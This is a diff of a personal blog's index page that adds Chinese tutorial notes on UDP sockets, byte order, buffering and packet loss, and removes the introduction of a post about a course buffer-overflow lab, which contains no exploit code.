@@ -49,9 +49,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -61,6 +61,61 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-网络（2）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/30/网络（2）/" class="article-date">
+  <time datetime="2018-04-30T04:13:32.000Z" itemprop="datePublished">2018-04-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/30/网络（2）/">网络（2）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a>网络字节序</h4><h5 id="按照字节传输"><a href="#按照字节传输" class="headerlink" title="按照字节传输"></a>按照字节传输</h5><p>网络上的数据是一个字节一个字节串行传递的。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[] = <span class="string">"hello"</span>;</span><br><span class="line">sock.SendTo(buf, <span class="number">5</span>, ...)</span><br></pre></td></tr></table></figure></p>
+<p>那么在信道中依次传输5个字节：<code>68 65 6c 6c 6f</code>。</p>
+<h5 id="大端与小端"><a href="#大端与小端" class="headerlink" title="大端与小端"></a>大端与小端</h5><p>当观察到一个<code>unsigned int</code>型变量的内存,<code>unsigned int a = 0x12345678;</code><br>在内存中的排列为<code>78 56 34 12</code>，却不是<code>12 34 56 78</code>，原因是因为这是一种规定。<br>小端：低位字节在内存的低地址端，高位字节在内存的高地址端。主流系统都是小端的（<code>intel/amd</code>）<br>大端：低位字节在内存的高地址端，高位字节在内存的低地址端。</p>
+<h5 id="网络传输字节序"><a href="#网络传输字节序" class="headerlink" title="网络传输字节序"></a>网络传输字节序</h5><p>网络传输的时候，惯例是按照大端传输的。即把接收到的第一个字节当做高位字节看待，这就要求发送端发送的第一个字节是高位字节，而在发送端发送数据时，发送的第一个字节应该是数值在内存中的起始地址对应的那个字节（即高位字节存放在低地址），将小端转换为大端：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">itob_32be</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> bytes[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bytes[<span class="number">0</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    bytes[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    bytes[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    bytes[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="更多细节"><a href="#更多细节" class="headerlink" title="更多细节"></a>更多细节</h4><h5 id="默认分配端口号"><a href="#默认分配端口号" class="headerlink" title="默认分配端口号"></a>默认分配端口号</h5><p>发送方<code>Socket</code>可以不显式的指定端口号：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UdpSocket sock;</span><br><span class="line">sock.open(); <span class="comment">//不带地址</span></span><br><span class="line">sock.SendTo(); <span class="comment">//发送数据</span></span><br></pre></td></tr></table></figure></p>
+<p><code>SendTo</code>函数被调用时，<code>OS</code>发现这个<code>Socket</code>还没有分配端口号，于是立即为其自动分配一个端口号，然后进行发送，接收方必须指定端口号的，发送方自动分配的端口号有一个区间，一般在<code>10000</code>以上。可以通过以下方式查看：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OS_SockAddr local;</span><br><span class="line">sock.GetLocalAddr(local);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> port = local.GetPort();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"local port: %d \n"</span>, port);</span><br><span class="line"><span class="comment">//在发送数据时，才会自动分配端口</span></span><br></pre></td></tr></table></figure></p>
+<h5 id="端口的占用"><a href="#端口的占用" class="headerlink" title="端口的占用"></a>端口的占用</h5><p>当一个<code>Socket</code>使用了某个端口，那么直到这个<code>Socket</code>被关闭，这个端口都处于被占用的状态。如果还想创建一个<code>Socket</code>，并且使用相同的端口，则创建失败。<code>sock.open()</code>返回-1。所以将端口号设置为可重用的。<code>sock.open</code>第二个参数即是能否重用的选项（内部间接调用了<code>SetOpt_ReuseAddr</code>这个函数）。一般要设置为<code>true</code>，因为有时候程序会意外关闭，即时重新启动当操作系统还没有释放这个端口时，会出现错误。</p>
+<h5 id="多个发送方，一个接收方"><a href="#多个发送方，一个接收方" class="headerlink" title="多个发送方，一个接收方"></a>多个发送方，一个接收方</h5><p>接收方可以区分一个消息是谁发送的：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">OS_SockAddr peer;</span><br><span class="line"><span class="keyword">int</span> n = sock.RecvFrom(buf, <span class="number">128</span>, peer);</span><br></pre></td></tr></table></figure></p>
+<p><code>RecvFrom</code>只是从“接受缓冲区”里取出一个数据包，这个数据包本身是带有源地址的。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> peer_ip = peer.GetIp_str();</span><br><span class="line"><span class="keyword">int</span> peer_port = peer.GetPort();</span><br></pre></td></tr></table></figure></p>
+<h5 id="阻塞与超时"><a href="#阻塞与超时" class="headerlink" title="阻塞与超时"></a>阻塞与超时</h5><h6 id="阻塞模式"><a href="#阻塞模式" class="headerlink" title="阻塞模式"></a>阻塞模式</h6><p>接收方<code>sock.RecvFrom</code>：</p>
+<ol>
+<li>如果<code>RecvBuf</code>中有数据，则函数立即返回。</li>
+<li>如果没有数据，则函数会一直等待，知道有数据时才取出数据，这个等待行为就是“阻塞”方式，可以设置最大等待时间，超过后如果仍然没有数据，函数返回-1。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock.SetOpt_RecvTimeOut(<span class="number">3000</span>) <span class="comment">//超过3s仍无数据，则RecvFrom返回-1</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h6 id="非阻塞模式"><a href="#非阻塞模式" class="headerlink" title="非阻塞模式"></a>非阻塞模式</h6><p>不管有没有数据，函数都立即返回，如果有数据，则返回值<code>&gt;0</code>，如果没有数据，则返回值为<code>-1</code>。此时，需要程序定时的去调用<code>RecvFrom</code>函数去查看有没有数据，这种设计模式叫做“轮询”。</p>
+<h4 id="双工通讯"><a href="#双工通讯" class="headerlink" title="双工通讯"></a>双工通讯</h4><p><strong>单工</strong>：单向通信，A只能发信号，B只能接收信号，通信是单向的。（广播、电视）<br><strong>半双工</strong>： 双向通信但是不能同时进行，A能发信号给B，B也能发信号给A，但这两个过程不能同时进行。（要么上行（上传），要么下行（下载），比如对讲机）<br><strong>全双工</strong>：双向通信互不影响，A给B发信号的同时，B也可以给A发信号。（上行下行可同时进行，手机、电话）<br><code>UDP</code>是双工的。可以使用多线程的方式实现全双工操作，一个线程负责读，另一个线程负责写。主要代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//发送线程</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Send</span>:</span> <span class="keyword">public</span> OS_Thread&#123;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Routine</span><span class="params">()</span> override</span>&#123;</span><br><span class="line">        OS_UdpSocket sock;</span><br><span class="line">        sock.Open();</span><br><span class="line">        <span class="function">OS_SockAddr <span class="title">peer</span><span class="params">(<span class="string">"127.0.0.1"</span>, <span class="number">9001</span>)</span></span>;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; buf;</span><br><span class="line">            <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            sock.SendTo(buf, len, peer);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf, <span class="string">"bye"</span>) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sock.Close();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Recv</span>:</span> <span class="keyword">public</span> OS_Thread&#123;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Routine</span><span class="params">()</span> override</span>&#123;</span><br><span class="line">        OS_UdpSocket sock;</span><br><span class="line">        sock.Open(OS_SockAddr(<span class="string">"127.0.0.1"</span>, <span class="number">9000</span>), ture);</span><br><span class="line">        OS_SockAddr peer;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> n = sock.RecvFrom(buf, <span class="number">128</span>, peer);</span><br><span class="line">            <span class="keyword">if</span>(n &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            buf[n] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sock.Close();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/04/30/网络（2）/" data-id="cjglqbwvc000efdqw0564az8j" class="article-share-link">Compartir</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-网络（1）" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -106,13 +161,45 @@
 <li>接收方：解复用<code>Demux</code><br>从信道中接收小包，根据包头里的Port，将小包还原成原始数据，再分发给不同的<code>Socket</code>处理。</li>
 </ol>
 <h6 id="大包拆分成小包"><a href="#大包拆分成小包" class="headerlink" title="大包拆分成小包"></a>大包拆分成小包</h6><p>一边拆一边合。每个包的包头加上一些标识。分包的目的是各个Socket均匀占用网络。</p>
-<h4 id="UDP-Socket"><a href="#UDP-Socket" class="headerlink" title="UDP Socket"></a>UDP Socket</h4><p><code>UDP</code>: <code>User Datagram Protocol</code>，用户数据报文协议。适用于局域网的主机间通信。两台主机上的程序，在知道了对方的<code>Socket</code>地址之后，就可以适用<code>UDP</code>传输数据。<br> 发送方：<code>UdpSocket sock; sock.sendTo(...)</code>。<br> 接收方：<code>UdpSocket sock; sock.RecvFrom(...)</code>。</p>
+<h4 id="UDP-Socket"><a href="#UDP-Socket" class="headerlink" title="UDP Socket"></a>UDP Socket</h4><p><code>UDP</code>: <code>User Datagram Protocol</code>，用户数据报文协议。适用于局域网的主机间通信。两台主机上的程序，在知道了对方的<code>Socket</code>地址之后，就可以适用<code>UDP</code>传输数据。<br> 发送方：<code>UdpSocket sock; sock.sendTo(...)</code>。<br> 接收方：<code>UdpSocket sock; sock.RecvFrom(...)</code>。<br> 主要代码如下所示：<br> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//发送方</span></span><br><span class="line"><span class="function">OS_SockAddr <span class="title">local</span><span class="params">(<span class="string">"127.0.0.1"</span>, <span class="number">9000</span>)</span></span>; <span class="comment">//ip和端口号</span></span><br><span class="line">OS_UdpSocket sock;</span><br><span class="line">sock.Open(local, <span class="literal">true</span>);</span><br><span class="line"><span class="function">OS_SockAddr <span class="title">peer</span><span class="params">(<span class="string">"127.0.0.1"</span>, <span class="number">9001</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"发送方: port 9000"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"&gt;"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; buf;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    sock.SendTo(buf, len, peer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf, <span class="string">"bye"</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">sock.Close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收方</span></span><br><span class="line"><span class="function">OS_SockAddr <span class="title">local</span><span class="params">(<span class="string">"127.0.0.1"</span>, <span class="number">9001</span>)</span></span>;</span><br><span class="line">OS_UdpSocket sock;</span><br><span class="line">sock.open(local, <span class="literal">true</span>);</span><br><span class="line"><span class="function">OS_SockAddr <span class="title">peer</span><span class="params">(<span class="string">"127.0.0.1"</span>, <span class="number">9000</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> n = sock.RecvFrom(buf, <span class="number">128</span>, peer);</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    buf[n] = <span class="number">0</span>; <span class="comment">//终止符</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Got: "</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"bye"</span>, buf) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">sock.Close();</span><br></pre></td></tr></table></figure></p>
 <h5 id="单机测试"><a href="#单机测试" class="headerlink" title="单机测试"></a>单机测试</h5><p>正常情况下，<code>Socket</code>编程的目的是为了将数据传送到另一台主机，因此需要两台主机才可以完成测试。例如<code>192.168.1.100 -&gt; 192.168.1.101</code>。当没有多主机环境时，可以使用单机测试，目标地址为<code>127.0.0.1</code>，表示本机。当指定发送目标为<code>127.0.0.1</code>时，发送的数据不经过网卡，直接在系统内回环送回。又称为<code>loopback</code>地址（回环地址）。<code>wireshark</code>无法监测<code>loopback</code>上的数据，因为根本没有通过网卡传送。</p>
+<h5 id="多机测试"><a href="#多机测试" class="headerlink" title="多机测试"></a>多机测试</h5><p>局域网下的多机测试，可以在一台交换机上插上两台主机，构建一个局域网，然后两台主机间可以通讯。如果没有两台主机，可以使用虚拟机构建多机测试环境。保证在同一个网段，将<code>ip</code>地址与子网掩码做与运算（默认<code>255.255.255.0</code>），如果相同则在同一个网段。<code>wireshark</code>中有实现过滤和事后过滤。</p>
+<h4 id="内部缓冲区"><a href="#内部缓冲区" class="headerlink" title="内部缓冲区"></a>内部缓冲区</h4><p><code>SendTo()</code>和<code>RecvFrom()</code>是由系统来完成的。那么</p>
+<ol>
+<li>在调用<code>SendTo</code>的时候，系统是立即发送的么？</li>
+<li>在调用<code>RecvFrom</code>的时候，系统是接到命令再去接收的么？<br>在系统内部，每个<code>Socket</code>关联了两个缓冲区(<code>Buffer</code>)，一个用于发送，一个用于接收。缓冲区实际上就是一片内存，用于暂时存储数据。</li>
+</ol>
+<h5 id="发送过程"><a href="#发送过程" class="headerlink" title="发送过程"></a>发送过程</h5><ol>
+<li><code>SendTo</code>把数据放在<code>SendBuf</code>里，通知<code>OS</code>来取。</li>
+<li><code>OS</code>在适当的时候过来取数据，并发送到网络。<br>这意味着存入数据和发送数据存在着时间差，如果数据存入太快太多，发送缓冲区可能会满。</li>
+</ol>
+<h5 id="接收过程"><a href="#接收过程" class="headerlink" title="接收过程"></a>接收过程</h5><ol>
+<li><code>OS</code>不停把从网络上接收的数据存储到<code>RecvBuf</code>里。</li>
+<li><code>RecvFrom</code>从缓冲区中取数据。<br>这意味着不论是否去取数据，<code>OS</code>总是默默的把数据先接收下来存储好，<code>RecvFrom</code>是从<code>RecvBuf</code>里取走现成的数据。如果不及时取走，则缓冲区可能会满。</li>
+</ol>
+<p>发送和接收是一个异步过程，发送的时候，先把数据放入缓冲区中，然后由<code>OS</code>安排发送，接收的时候，由<code>OS</code>先接收下来存在缓冲区，而<code>RecvFrom</code>只是从缓冲区取走现成的数据。</p>
+<h5 id="“缓冲区满”的处理"><a href="#“缓冲区满”的处理" class="headerlink" title="“缓冲区满”的处理"></a>“缓冲区满”的处理</h5><h6 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h6><ol>
+<li>直到缓冲区有剩余空间（阻塞）。</li>
+<li>新发送的数据没有存入缓冲区。</li>
+</ol>
+<h6 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h6><ol>
+<li>新的数据不被接收。</li>
+<li>删除缓冲区里的现有数据，存放新的数据<br>1和2都会引起丢包现象</li>
+</ol>
+<h6 id="设置发送-接收缓冲区的大小"><a href="#设置发送-接收缓冲区的大小" class="headerlink" title="设置发送/接收缓冲区的大小"></a>设置发送/接收缓冲区的大小</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setsocketopt(sock.hSock, SOL_SOCKET, <span class="comment">//opt即为option</span></span><br><span class="line">    SO_SENBUF, <span class="comment">//代表sendBuf，SO_RCVBUF代表recvBuf</span></span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">char</span>*)&amp;bufsize,</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="keyword">int</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>设置成功与否由操作系统决定。</p>
+<h6 id="丢包问题"><a href="#丢包问题" class="headerlink" title="丢包问题"></a>丢包问题</h6><p>一般情况下，设置缓冲区的大小并不能解决“丢包”问题。<br>要注意一下三个方面：</p>
+<ol>
+<li>发送是否均匀。</li>
+<li>接收是否及时。</li>
+<li>接收带宽是否超过实际传输带宽。发送数据量过大会丢包。视频包可能会出现。<br>另外，即使<code>HostA</code>和<code>HostB</code>处理的都没有问题，网络上的任意一个中间节点设备都有可能丢包。丢包问题对于<code>USP</code>来说是很常见的，再设计是就要考虑到这一点，再决定使用<code>UDP</code>的时候就应该允许丢包，要做的是尽量的减少丢包。</li>
+</ol>
+<h6 id="适合UDP传输的情况"><a href="#适合UDP传输的情况" class="headerlink" title="适合UDP传输的情况"></a>适合UDP传输的情况</h6><p>允许丢包的场合，比如每秒钟把设备的实时数据发送给管理主机，在管理主机的界面上显示。这种情况即使丢了一次包，也没有太大关系，下次会继续发送的。但是当传输压缩文件*.rar，如果丢了一个包，整个文件就损坏了。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/27/网络（1）/" data-id="cjgi1qwq5000gs3qwyt203wcg" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/27/网络（1）/" data-id="cjglqbwv0000bfdqw7i0tjd1b" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
@@ -160,7 +247,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/27/线程（3）/" data-id="cjgi1qwq2000es3qwetusj6gn" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/27/线程（3）/" data-id="cjglqbww2000nfdqwoatsrih0" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/线程/">线程</a></li></ul>
@@ -232,7 +319,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/27/线程（2）/" data-id="cjgi1qwq0000cs3qwnwkweg7n" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/27/线程（2）/" data-id="cjglqbwvs000lfdqw4bt8mou0" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/线程/">线程</a></li></ul>
@@ -309,7 +396,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/26/线程（1）/" data-id="cjgi1qwpx000as3qwywn4miqp" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/26/线程（1）/" data-id="cjglqbwuu000afdqwugkkszyo" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/线程/">线程</a></li></ul>
@@ -381,7 +468,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/25/Building-C-Projects/" data-id="cjgi1qwom0000s3qwif9kxyh5" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/25/Building-C-Projects/" data-id="cjglqbwtu0004fdqw4kmxuok5" class="article-share-link">Compartir</a>
       
       
     </footer>
@@ -421,7 +508,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/25/面试复习（2）/" data-id="cjgi1qwq8000ks3qwobnij5on" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/25/面试复习（2）/" data-id="cjglqbwvo000jfdqwt1rih9jw" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复习/">复习</a></li></ul>
@@ -484,7 +571,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/22/LLVM学习（3）/" data-id="cjgi1qwpt0006s3qwaumbdh1o" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/22/LLVM学习（3）/" data-id="cjglqbwvf000ffdqwzow2s1qi" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LLVM/">LLVM</a></li></ul>
@@ -533,7 +620,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/20/LLVM学习（2）/" data-id="cjgi1qwpr0005s3qw05wxq6k4" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/20/LLVM学习（2）/" data-id="cjglqbwu80005fdqw1iy0q4l1" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LLVM/">LLVM</a></li></ul>
@@ -615,131 +702,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/18/面试复习/" data-id="cjgi1qwq6000is3qwqbedu0on" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2018/04/18/面试复习/" data-id="cjglqbwvi000gfdqwlzppdf42" class="article-share-link">Compartir</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复习/">复习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-HSI-buffer-overflow" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/04/HSI-buffer-overflow/" class="article-date">
-  <time datetime="2018-04-04T14:26:29.000Z" itemprop="datePublished">2018-04-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/04/HSI-buffer-overflow/">HSI buffer overflow</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这是华盛顿大学hardware/software interface这门课的缓冲溢出攻击实验，并不复杂并且非常有意思。</p>
-<h2 id="Instrcution"><a href="#Instrcution" class="headerlink" title="Instrcution"></a>Instrcution</h2><p>实验中的文件主要有以下五个：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">File</th>
-<th style="text-align:left">description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">makecookie</td>
-<td style="text-align:left">Generates a “cookie” based on something</td>
-</tr>
-<tr>
-<td style="text-align:left">bufbomb</td>
-<td style="text-align:left">The executable you will attack</td>
-</tr>
-<tr>
-<td style="text-align:left">bufbomb.c</td>
-<td style="text-align:left">The important bits of C code used to compile bufbomb</td>
-</tr>
-<tr>
-<td style="text-align:left">sendstring</td>
-<td style="text-align:left">A utility to help convert between string formats</td>
-</tr>
-<tr>
-<td style="text-align:left">Makefile</td>
-<td style="text-align:left">For testing all your exploits prior to submission</td>
-</tr>
-</tbody>
-</table>
-<h3 id="Making-your-cookie"><a href="#Making-your-cookie" class="headerlink" title="Making your cookie"></a>Making your cookie</h3><p>需要一个id作为makecookie文件的输入，这里使用qlbaird作为输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./makecookie qlbaird</span><br><span class="line">0x515f786d5c8d77de</span><br></pre></td></tr></table></figure></p>
